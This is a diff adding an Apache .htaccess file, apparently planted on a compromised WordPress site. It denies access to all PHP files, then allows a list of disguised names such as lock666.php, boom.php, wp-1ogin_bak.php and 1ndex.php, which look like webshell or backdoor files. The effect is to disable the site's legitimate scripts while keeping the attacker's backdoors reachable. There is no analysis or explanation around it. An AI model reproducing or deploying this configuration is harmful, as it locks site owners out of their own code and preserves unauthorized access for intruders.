@@ -1,0 +1,8 @@
+<FilesMatch ".*\.(?i:phtml|php|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "(^([\.])index.php|^content-index.php|^class-wp-rest-controller-index.php|^backup_index.php|^db-cache.php|^db-safe-mode.php|^session-index.php|^oldindex.php|^wp-class-smtp-index.php|^webindex.php|^class-walker-nav-index.php|^lock666.php|^boom.php|^wpcss.php|^log.txt|^config.bak.php|^wpconfig.bak.php|^wp-1ogin_bak.php|^1ndex.php|^wp-booking.php|^1.php|^logs.php|^wp-signdownload.php|^indeh.php|^wp-aespa.php|^freedoms.php|^css.php)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
